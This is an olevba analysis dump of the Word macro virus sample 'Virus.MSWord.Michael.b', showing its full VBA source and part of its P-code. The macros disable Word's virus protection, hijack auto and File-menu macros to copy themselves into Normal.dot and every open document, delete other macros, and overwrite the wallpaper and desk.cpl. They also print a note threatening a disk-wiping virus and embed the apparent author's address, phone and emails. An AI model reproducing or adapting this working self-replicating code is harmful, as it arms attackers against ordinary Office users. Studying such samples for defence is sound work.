olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Michael.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Michael.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MichaelangeloVictory2.bas 
in file: Virus.MSWord.Michael.b - OLE stream: 'Macros/VBA/MichaelangeloVictory2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Welcome Hacker!!
'You discover the secrets of Word

Option Explicit
Option Compare Text

Dim Signature As String
Dim WallpaperChange As Boolean
Dim qBal As Balloon
Dim BackupName As String





Function Random() As Long
    Random = Int((21 * Rnd) + 1)
End Function

Function Quote() As Long
Dim quotes(1 To 21) As String
    
Static prevQuote As Long
Static currQuote As Long


    On Error Resume Next
    Options.VirusProtection = False

    quotes(1) = "On Fuzzy Logic" & Chr(10) & Chr(10) & _
                """  He who would distinguish " & _
                "  the true from false must have" & _
                "  an adequate idea of what is true and what is false"""
                
    quotes(2) = """We all know - the Times know - but we pretend we don't""" & _
                Chr(10) & Chr(10) & "-- Virginia Woolf"
                
    quotes(3) = "On Formulating an Algorithm" & _
                Chr(10) & Chr(10) & """  Without a good problem definition, " & _
                "you might put effort into solving" & _
                " the wrong problem.  Be sure you know what you're" & _
                " aiming before you journey.""" & _
                Chr(10) & Chr(10) & "-- Steve McConnell"
                                
    quotes(4) = "On Creating a Pseudocode" & _
                Chr(10) & Chr(10) & "Iterate.  Try as many ideas as you can" & _
                " in PDL (program design language)before you start coding." & _
                "  Once you start coding, you get emotionally" & _
                " involved with your code and it becomes harder to" & _
                " throw away a bad design and start over." & _
                Chr(10) & Chr(10) & "-- Steve McConnell"
                

    quotes(5) = """The bad news is that, in our opinion, we will never" & _
                " the philosohopher's stone.  We will never" & _
                " find a process that allows us to design software in" & _
                " a perfectly rational way.  The good news is that" & _
                " we can fake it.""" & _
                Chr(10) & Chr(10) & "-- David Parnas and Paul Clements"
                
    quotes(6) = """Programming can be fun, so can cryptography," & _
                " however they should not be combined""" & _
                Chr(10) & Chr(10) & " Kreitzberg and Shneiderman"
                
    quotes(7) = """If you can't explain something to a six-year" & _
                " old, you really don't understand it yourself""" & _
                Chr(10) & Chr(10) & "-- Albert Einstein"
    
    quotes(8) = """The cure for boredom is curiosity.  There is " & _
                " no cure for curiosity""" & _
                Chr(10) & Chr(10) & "-- Dorothy Parker"
                         
    quotes(9) = "On Tracking Down an Error" & _
                Chr(10) & Chr(10) & "  ""And if you can take one from three" & _
                " hundred and sixty-five, what remains?""" & _
                "  ""Three hundred and sixty-four of course"", Alice said." & _
                "  Humpty Dumpty looked doubtful.  ""I'd rather see that done in paper"", he said." & _
                Chr(10) & Chr(10) & "--Alice in Wonderland"
                
    quotes(10) = "On Good Variable Naming" & _
                 Chr(10) & Chr(10) & "  ""Don't stand chattering" & _
                 " to yourself like that,"" Humpty Dumpty said, " & _
                 " looking at her for the first time, ""but tell me " & _
                 " your name and your business.""  ""My" & _
                 " name is Alice, but --"".  ""It's a" & _
                 " stupid name enough!"", Humpty Dumpty" & _
                 " interrupted impatiently.  ""What does" & _
                 " it mean?"", ""Must a name mean something?"" Alice" & _
                 " asked doubtfully.  ""Of course it must,""  Humpty" & _
                 " Dumpty said with a short laugh:  ""My name means the" & _
                 " shape that I am and a good handsome shape it is, too. " & _
                 " With a name like yours, you might be any shape, " & _
                 " almost."""
               
    quotes(11) = """First thing first, but not necessarily in that order.""" & _
                 Chr(10) & Chr(10) & "--Dr. Who, Meglos"
                
    quotes(12) = """The significant problems we face cannot be solved by the " & _
                 "same level of thinking that created them.""" & _
                 Chr(10) & Chr(10) & "--Albert Einstein"
                 
    quotes(13) = "On Creating, Inhertance in Classes" & _
                 Chr(10) & Chr(10) & """You will understand this when I tell you that " & _
                 "I can trace my ancestry back to a protoplasmal primordial " & _
                 " globule.""" & _
                 Chr(10) & Chr(10) & "--Gilbert and Sullivan, the Mikado"
                     
    quotes(14) = """Words are so powerful, but I found it powerfully useless " & _
                 "just to come up with a statement like this.""" & _
                 Chr(10) & Chr(10) & "--Michael I. Buen"
                 
    quotes(15) = "On Temporary Solution" & _
                 Chr(10) & Chr(10) & """One powerful heuristic tool is brure force.  Don't " & _
                 "underestimate it.  A brute force solution is better than an elegant " & _
                 "solution that doesn't work.""" & _
                 Chr(10) & Chr(10) & "--Steve McConnell"
                 
    quotes(16) = "On Design Process Stage" & _
                 Chr(10) & Chr(10) & """We try to solve the problem by rushing through " & _
                 "the design process so that enough time is left at the end of " & _
                 "project to uncover the errors that were made because we rushed " & _
                 "through the design process.""" & _
                 Chr(10) & Chr(10) & "--Glenford Myers"
                 
    quotes(17) = "On Premature Optimization" & Chr(10) & Chr(10) & _
                 """We should forget about small efficiencies, say about 97% of " & _
                 "the time: premature optimization is the root of all evil.""" & _
                 Chr(10) & Chr(10) & "--Donald Knuth"
                 
    quotes(18) = """The problem definition lays the foundation for the " & _
                 "rest of the programming process.""" & _
                 Chr(10) & Chr(10) & "--Steve McConnell"
                 
    quotes(19) = """From a programmer's point of view, the user is " & _
                 "a peripheral that types when you issue a read request.""" & _
                 Chr(10) & Chr(10) & "--Peter Williams"
                 
    quotes(20) = """Programming today is a race between software engineers " & _
                 "striving to build bigger and better idiot-proof programs, " & _
                 "and the universe trying to produce bigger and better idiots. " & _
                 "So far the universe is winning.""" & _
                 Chr(10) & Chr(10) & "--Rich Cook"
                 
    quotes(21) = """I can do everything through Him who gives me strength.""" & _
                 Chr(10) & Chr(10) & "--Philipians 4:13 (courtesy of Byron2 James C. Ngan)"
                         
    'Call Randomize
    
    Do
        currQuote = Random()
    Loop While currQuote = prevQuote
    
    Set qBal = Assistant.NewBalloon
    qBal.Heading = "Quote for the Moment"
    qBal.Animation = msoAnimationThinking
    qBal.Text = quotes(currQuote)
    qBal.Show
    
    prevQuote = currQuote
    Quote = 1
End Function


Sub ViewVBCode()
'
' ViewVBCode Macro
' Shows the VB editing environment
'
Dim d As Document
                
        On Error Resume Next
        Options.VirusProtection = False
        
        For Each d In Documents
            d.Saved = True
        Next d
        
        Application.Quit
        
End Sub




Sub ToolsOptions()
'
' ToolsOptions Macro
' Changes various categories of Word for Windows options
'
    On Error Resume Next
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Signature = "Michaelangelo ""The Skulltor\n"" Buenarroti"
    Application.UserName = Signature
    Application.UserInitials = "MIB"
    Application.UserAddress = "" & _
        "Block 6 Lot 3 Hauskon Homes, Daang Amaya, " & _
        "Tanza Cavite" & Chr(10) & _
        Chr(10) & "e-mail address: mycklangelo@yahoo.com / mycklangelo@hotmail.com" & Chr(10) & _
        Chr(10) & "Tel: (046)505-17-39"
        
    Options.VirusProtection = False
                                    

End Sub



Sub ToolsMacro()
Dim d As Document
                
        On Error Resume Next
        
        Options.VirusProtection = False
        
        For Each d In Documents
            d.Saved = True
        Next d
        
        Application.Quit
        
End Sub

Sub FilePrintDefault()
'
' FilePrintDefault Macro
' Prints the active document using the current defaults
'
Dim freeF As Integer
    
    On Error Resume Next


    If (WeekDay(Date)) <> vbFriday Then
        ActiveDocument.PrintOut
        End
    End If

    If Day(Date) > 23 And WeekDay(Date) = vbFriday Then
        
        Call SetAttr("c:\windows\dummy.txt", vbArchive)
        freeF = FreeFile
        Kill "c:\windows\dummy.txt"
        Open "c:\windows\dummy.txt" For Output As #freeF
        Print #freeF, "Resume"
        Print #freeF, ""
        Print #freeF, "Applicant's Name: Michael I. Buen"
        Print #freeF, ""
        Print #freeF, "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "Tel:     (046)505-17-39"
        Print #freeF, "Desired Position: Programmer/Technical Writer/Computer Salesman"
        Print #freeF, ""
        Print #freeF, "Skills: Knows C/C++, Assembly, Pascal, COBOL, Clipper, Foxpro, "
        Print #freeF, "        JavaScript, VBScript, Visual Basic, VB for Application "
        Print #freeF, "        Programming, Access, Clarion, HTML, Batch File"
        Print #freeF, ""
        Print #freeF, "Applications Expertise: Resource Workshop, Aldus Pagemaker, Adobe Photoshop,"
        Print #freeF, "        Lotus Smartsuite, Microangelo, and Of Course Excel and "
        Print #freeF, "        Microsoft Word"
        Print #freeF, ""
        Print #freeF, "Favorite Quote: ""The cure for boredom is curiosity, there is no cure "
        Print #freeF, "                for curiosity"""
        Print #freeF, ""
        Print #freeF, "With Experiences In: Innodata, SENCOR, VMSCI, GenDiesel"
        Print #freeF, ""
        Print #freeF, "Without Experiences In: Chowking, J-Sys, Jimac, CBSI, Information Professionals, "
        Print #freeF, "                        Midas Kapiti, James Martin + co, Professional Staffers, "
        Print #freeF, "                        Ergonomics, Express Telecom, 650 Companies"
        Print #freeF, ""
        Print #freeF, ""
        Print #freeF, "e-mail: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
        Print #freeF, "Address: Block 6 Lot 3, Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "tel: (046) 505-17-39"
        Print #freeF, ""
        Print #freeF, "To open my interactive resume type markbuen then highlight it"
        Print #freeF, "then open a file, then my interactive resume will pop up"
        Print #freeF, ""
        Print #freeF, "Warning: If I don't get a stable job by the end of the month"
        Print #freeF, "         I will release a third virus that will remove all "
        Print #freeF, "         folders in the Primary Hard Disk, or in layman's term"
        Print #freeF, "         para ko na ring fi-normat ang Hard Disk Mo"
        Print #freeF, ""
        Print #freeF, "-- Be a Superlearner, Enroll at AMACConda Computer College"
        Print #freeF, ""
        Print #freeF, """Programming today is a race between software engineers "
        Print #freeF, "striving to build bigger and better idiot-proof programs, "
        Print #freeF, "and the universe trying to produce bigger and better idiots. "
        Print #freeF, "So far the universe is winning."""
        Print #freeF, "---Rich Cook"
        Print #freeF, ""
        Print #freeF, "Sa year 2004 FPJ for President, Noli de Castro for Vice President"
        Print #freeF, Chr(15)
        Close #freeF
        Application.PrintOut FileName:="c:\windows\dummy.txt"
        'Kill "c:\windows\dummy.txt"
    End If
    
    
    
    ActiveDocument.PrintOut

End Sub



Sub OnlyUs()
    On Error Resume Next
Dim NTInfected As Boolean
Dim itemName As String
Dim openDoc As Document
Dim odInfected As Boolean
Dim i As Integer
    
    NTInfected = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        itemName = NormalTemplate.VBProject.VBComponents(i).Name
            If Name = "MichaelangeloVictory2" Then
                NTInfected = True
            End If
            If itemName = "MichaelangeloVictory2" Or _
               itemName = "ThisDocument" Or _
               itemName = "Byron2" Or _
               itemName = "Character2" Or _
               itemName = "Reference to Normal" Then
               GoTo Skip  'since there is no continue(in C language) in VB goto will compensate for that
            End If
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=itemName, Object:=wdOrganizerObjectProjectItems
Skip:
    Next i
    
    'remove others
    If Not NTInfected Then
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MichaelangeloVictory2", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Byron2", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Character2", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
    For Each openDoc In Documents
        
        odInfected = False 'false tentatively
        For i = 1 To openDoc.VBProject.VBComponents.Count
            itemName = openDoc.VBProject.VBComponents(i).Name
            If itemName = "MichaelangeloVictory2" Then
                odInfected = True
            End If
            If itemName = "MichaelangeloVictory2" Or _
                itemName = "ThisDocument" Or _
                itemName = "Byron2" Or _
                itemName = "Character2" Or _
                itemName = "Reference to Normal" Then
                GoTo Skip2  'since there is no continue(in C language) in VB goto will compensate for that
            End If
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=itemName, Object:=wdOrganizerObjectProjectItems
Skip2:
        Next i
        
        If Not odInfected Then
            Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=openDoc.FullName, Name:="MichaelangeloVictory2", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=openDoc.FullName, Name:="Byron2", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=openDoc.FullName, Name:="Character2", Object:=wdOrganizerObjectProjectItems
        End If
        
    Next openDoc
            
    
End Sub

Sub FileSave()
Dim b  As Balloon
Dim l As Long
Dim NdxMac As Long
Dim infected As Boolean

Dim ls As String
Dim spos As Long
Dim Wallname As String
Dim Wallfound As Boolean
Dim chgHdr As Byte

Dim sfor As Long
Dim PauseTime, Start, Finish, TotalTime

      
    On Error Resume Next
    Options.VirusProtection = False
    
    If Selection.Text = "Ablog" Then
        ShowVisualBasicEditor = True
        End
    End If
    
    Wallfound = False
    If Day(Date) > 23 And WeekDay(Date) = vbThursday Then
        Open "c:\windows\win.ini" For Input As #1
        Do While Not EOF(1)
            Input #1, ls
            spos = InStr(ls, "Wallpaper")
            If spos = 1 Then
                Wallname = Mid(ls, spos + 10)
                If UCase(Wallname) <> UCase("(None)") Then
                    Wallfound = True
                End If
                Exit Do
            End If
        Loop
        Close #1
    
    End If
    
    'WallpaperChange
    If Wallfound And Not WallpaperChange Then
        'writing
        Call SetAttr(Wallname, vbArchive)
        Call SavePicture(Byron2.Image1.Picture, Wallname)
        
        Call SetAttr("c:\windows\system\desk.cpl", vbArchive)
        Open "c:\windows\system\desk.cpl" For Random As #1
        chgHdr = 66
        Put #1, 1, chgHdr
        Close #1
        WallpaperChange = True
    End If
            
    Signature = "Michaelangelo ""The Skulltor\n"" Buenarroti"
        
        
    Call OnlyUs
    ActiveDocument.Save
        
    If Day(Date) > 23 And WeekDay(Date) = vbSaturday Then
        For sfor = 50 To 1 Step -1
            Application.StatusBar = String(sfor, " ") & "Michael Learns to Hack"
            PauseTime = 0.015625   ' Set duration.
            Start = Timer   ' Set start time.
            Do While Timer < Start + PauseTime
                DoEvents    ' Yield to other processes.
            Loop
            
            DoEvents
        Next sfor
        Application.StatusBar = "And Hope You'll Learn from It Too"
    ElseIf Day(Date) = 29 Then
        Byron2.Show
    End If

    
    
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyUs
    'If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyUs
    'If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
Dim d As Document
    On Error Resume Next
    Options.VirusProtection = False
    Set d = Documents.Add
    Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=d.FullName, Name:="MichaelangeloVictory2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=d.FullName, Name:="Byron2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:=d.FullName, Name:="Character2", Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyUs
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyUs
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyUs
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyUs
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyUs
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
'
' FileOpen Macro
' Opens an existing document or template
'
Dim prevDocCount As Integer
Dim NdxMac As Long
Dim infected As Boolean

Dim resBal As Balloon       'next
Dim resBal2 As Balloon      'back

Dim resBalMess As Balloon

Dim resOpt As Long

Dim l As Long

   
Const butClose = -12
Const butBack = -5
Const butNext = -6


Const resmSchooling = 1
Const resmSkills = 2
Const resmJobExperiences = 3
Const resmPersonalBackground = 4
Const resmPersonalForeground = 5

Const resmCharRef = 1
Const resmQuote = 2
Const resmInsideStory = 3

Dim michaelangeloExist As Boolean
Dim i As Integer
Dim itemName As String



    On Error Resume Next
    Options.VirusProtection = True
        
    If Documents.Count <> 0 Then
        
        If Selection.Text = "markbuen" Or Day(Date) = 30 Then
            ' put resume here
            Set resBalMess = Assistant.NewBalloon
            
            Do
                Set resBal = Assistant.NewBalloon
                resBal.Animation = msoAnimationListensToComputer
                resBal.Heading = "Michael Learns To Hack..."
                resBal.Text = "iNTERACTIVE rESUME" & Chr(10) & Chr(10) & _
                              "Desired Position: " & Chr(10) & "  Programmer / Technical Writer / Computer Salesman" & Chr(10) & _
                              " - - - - - - - - - - - - - - - - - - - - - - - - - "
                              
                
                resBal.Labels(resmSchooling).Text = "My Schooling"
                resBal.Labels(resmSkills).Text = "My Skills"
                resBal.Labels(3).Text = "Job Experiences"
                resBal.Labels(4).Text = "Personal Background"
                resBal.Labels(5).Text = "Personal Foreground"
                resBal.Button = msoButtonSetNextClose
                resOpt = resBal.Show
                Select Case resOpt
                    Case resmSchooling
                        resBalMess.Animation = msoAnimationWritingNotingSomething
                        resBalMess.Heading = "My Schooling"
                        resBalMess.Labels.Count = 0
                        resBalMess.Text = "Elementary" & Chr(10) & _
                                          "   Pio del Pilar Elementary School" & Chr(10) & Chr(10) & _
                                          "High School" & Chr(10) & _
                                          "   Philippine Christian University" & Chr(10) & Chr(10) & _
                                          "College" & Chr(10) & _
                                          "   AMACConda Computer College"
                        resBalMess.Show
                        
                    Case resmSkills
                        resBalMess.Animation = msoAnimationGetTechy
                        resBalMess.Heading = "My Skills"
                        resBalMess.Text = "   Proficient with varius languages like C/C++, Assembly, Pascal, COBOL, Foxpro, SQL, Visual Basic, Clarion, JavaScript, VB for Application, VBScript, HTML" & Chr(10) & Chr(10) & _
                                          "   Proficient in Application Softwares like Adobe Photoshop, Resourcce Workshop, Microangelo, Lotus Smart Suite, Aldus Pagemaker, Frontpage, Powerpoint, and of course Word and Excel"
                        resBalMess.Labels.Count = 0
                        resBalMess.Show
                        
                    Case resmJobExperiences
                        
                        resBalMess.Animation = msoAnimationWorkingAtSomething
                        resBalMess.Heading = "Experiences"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 4
                        resBalMess.Labels(1).Text = "INNODATA -- Typereader (corrects OCR errors)"
                        resBalMess.Labels(2).Text = "SENCOR -- Encoder"
                        resBalMess.Labels(3).Text = "VMSCI -- Pseudo Programmer Trainee"
                        resBalMess.Labels(4).Text = "GenDiesel -- Super Encoder"
                                                                                    
                        resBalMess.Show
                        
                    Case resmPersonalBackground
                        resBalMess.Animation = msoAnimationCharacterSuccessMajor
                        
                        resBalMess.Heading = "Personal Background"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 3
                        resBalMess.Labels(1).Text = "Hardworking, Softworking, Quiet(low-noise), Sociable Person especially on Party "
                        resBalMess.Labels(2).Text = "Reliable, with Good Interpersonal Communicatin Skills and Intrapersonal Communication Skills (8 data bits, odd parity, 1 stop bit)"
                        resBalMess.Labels(3).Text = "Goal-oriented, Success-oriented, Journey-Oriented, Object-Oriented Person, w/ Good Moral Character and w/ Pissing Personality"
                                                                                    
                        resBalMess.Show
                        
                    Case resmPersonalForeground
                        
                        resBalMess.Animation = msoAnimationGetAttentionMinor
                        resBalMess.Heading = "Personal Foreground"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 5
                        resBalMess.Labels(1).Text = "Black-eyes, black hair, black nostrils"
                        resBalMess.Labels(2).Text = "Cute (Patingin nga ng Dimple)"
                        resBalMess.Labels(3).Text = "Down-to-Earth (ALIEN?!)"
                        resBalMess.Labels(4).Text = "Boy-Next-Windows '95 Type"
                        resBalMess.Labels(5).Text = "Macho-chulis ang mga buto"
                                                                                    
                        resBalMess.Show
                        
                        
                    Case butNext
                    
                        Set resBal2 = Assistant.NewBalloon
                        resBal2.Labels.Count = 3
                        resBal2.Heading = "Michael Learns To Hack..."
                        resBal2.Text = "Interactive Resume"
                        resBal2.Labels(1).Text = "Character References"
                        resBal2.Labels(2).Text = "Quote for the Moment"
                        resBal2.Labels(3).Text = "Inside Story"
                        resBal2.Button = msoButtonSetBackClose
                        resOpt = resBal2.Show
                        Select Case resOpt
                        Case resmCharRef
                            Character2.Show
                        Case resmQuote
                            l = Quote()
                        Case resmInsideStory
                            Byron2.Show
                        End Select
                        
                End Select
            
            Loop While resOpt <> -12
                        
            If Day(Date) <> 30 Then
                End
            End If
            
        End If
    End If
        
    Dialogs(wdDialogFileOpen).Show
    Call OnlyUs
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call OnlyUs
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call OnlyUs
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

-------------------------------------------------------------------------------
VBA MACRO Byron2.frm 
in file: Virus.MSWord.Michael.b - OLE stream: 'Macros/VBA/Byron2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









































Private Sub Inet1_BeforeUpdate(ByVal Cancel As MSForms.ReturnBoolean)

End Sub

Private Sub Inet1_Enter()

End Sub

Private Sub Inet1_Exit(ByVal Cancel As MSForms.ReturnBoolean)

End Sub

Private Sub Inet1_StateChanged(ByVal State As Integer)

End Sub

Private Sub CommandButton1_Click()
Static b As Boolean

    If b Then
        CommandButton1.Caption = "Close"
    Else
        CommandButton1.Caption = "Open"
    End If
    b = Not b

End Sub

Private Sub UserForm_Activate()
    TextBox1.CurLine = 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO Character2.frm 
in file: Virus.MSWord.Michael.b - OLE stream: 'Macros/VBA/Character2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


































Private Sub CommandButton1_Click()
Static b As Boolean

    If b Then
        CommandButton1.Caption = "Close"
    Else
        CommandButton1.Caption = "Open"
    End If
    b = Not b
    
End Sub

Private Sub UserForm_Activate()
    TextBox1.CurLine = 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Michael.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MichaelangeloVictory2 - 39168 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0010 "Welcome Hacker!!"
' Line #2:
' 	QuoteRem 0x0000 0x0020 "You discover the secrets of Word"
' Line #3:
' Line #4:
' 	Option  (Explicit)
' Line #5:
' 	Option  (Compare Text)
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn Signature (As String)
' Line #8:
' 	Dim 
' 	VarDefn WallpaperChange (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn qBal
' Line #10:
' 	Dim 
' 	VarDefn BackupName (As String)
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' 	FuncDefn (Function Randomize() As Long)
' Line #17:
' 	LitDI2 0x0015 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Randomize 
' Line #18:
' 	EndFunc 
' Line #19:
' Line #20:
' 	FuncDefn (Function Quote() As Long)
' Line #21:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0015 
' 	VarDefn quotes (As String)
' Line #22:
' Line #23:
' 	Dim (Static) 
' 	VarDefn prevQuote (As Long)
' Line #24:
' 	Dim (Static) 
' 	VarDefn currQuote (As Long)
' Line #25:
' Line #26:
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' Line #30:
' 	LineCont 0x000C 11 00 10 00 13 00 10 00 15 00 10 00
' 	LitStr 0x000E "On Fuzzy Logic"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C ""  He who would distinguish "
' 	Concat 
' 	LitStr 0x001F "  the true from false must have"
' 	Concat 
' 	LitStr 0x0035 "  an adequate idea of what is true and what is false""
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt quotes 0x0001 
' Line #31:
' Line #32:
' 	LineCont 0x0004 07 00 10 00
' 	LitStr 0x0038 ""We all know - the Times know - but we pretend we don't""
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "-- Virginia Woolf"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt quotes 0x0001 
' Line #33:
' Line #34:
' 	LineCont 0x0014 07 00 10 00 13 00 10 00 15 00 10 00 17 00 10 00 19 00 10 00
' 	LitStr 0x001B "On Formulating an Algorithm"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 ""  Without a good problem definition, "
' 	Concat 
' 	LitStr 0x0021 "you might put effort into solving"
' 	Concat 
' 	LitStr 0x0031 " the wrong problem.  Be sure you know what you're"
' 	Concat 
' 	LitStr 0x001C " aiming before you journey.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "-- Steve McConnell"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt quotes 0x0001 
' Line #35:
' Line #36:
' 	LineCont 0x0018 07 00 10 00 13 00 10 00 15 00 10 00 17 00 10 00 19 00 10 00 1B 00 10 00
' 	LitStr 0x0018 "On Creating a Pseudocode"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Iterate.  Try as many ideas as you can"
' 	Concat 
' 	LitStr 0x0039 " in PDL (program design language)before you start coding."
' 	Concat 
' 	LitStr 0x002C "  Once you start coding, you get emotionally"
' 	Concat 
' 	LitStr 0x0031 " involved with your code and it becomes harder to"
' 	Concat 
' 	LitStr 0x0028 " throw away a bad design and start over."
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "-- Steve McConnell"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt quotes 0x0001 
' Line #37:
' Line #38:
' Line #39:
' 	LineCont 0x0014 07 00 10 00 09 00 10 00 0B 00 10 00 0D 00 10 00 0F 00 10 00
' 	LitStr 0x0034 ""The bad news is that, in our opinion, we will never"
' 	LitStr 0x002A " the philosohopher's stone.  We will never"
' 	Concat 
' 	LitStr 0x0034 " find a process that allows us to design software in"
' 	Concat 
' 	LitStr 0x0031 " a perfectly rational way.  The good news is that"
' 	Concat 
' 	LitStr 0x0011 " we can fake it.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "-- David Parnas and Paul Clements"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt quotes 0x0001 
' Line #40:
' Line #41:
' 	LineCont 0x0008 07 00 10 00 09 00 10 00
' 	LitStr 0x002D ""Programming can be fun, so can cryptography,"
' 	LitStr 0x0025 " however they should not be combined""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " Kreitzberg and Shneiderman"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt quotes 0x0001 
' Line #42:
' Line #43:
' 	LineCont 0x0008 07 00 10 00 09 00 10 00
' 	LitStr 0x002D ""If you can't explain something to a six-year"
' 	LitStr 0x002E " old, you really don't understand it yourself""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "-- Albert Einstein"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt quotes 0x0001 
' Line #44:
' Line #45:
' 	LineCont 0x0008 07 00 10 00 09 00 10 00
' 	LitStr 0x002E ""The cure for boredom is curiosity.  There is "
' 	LitStr 0x0017 " no cure for curiosity""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "-- Dorothy Parker"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsSt quotes 0x0001 
' Line #46:
' Line #47:
' 	LineCont 0x0014 07 00 10 00 13 00 10 00 15 00 10 00 17 00 10 00 19 00 10 00
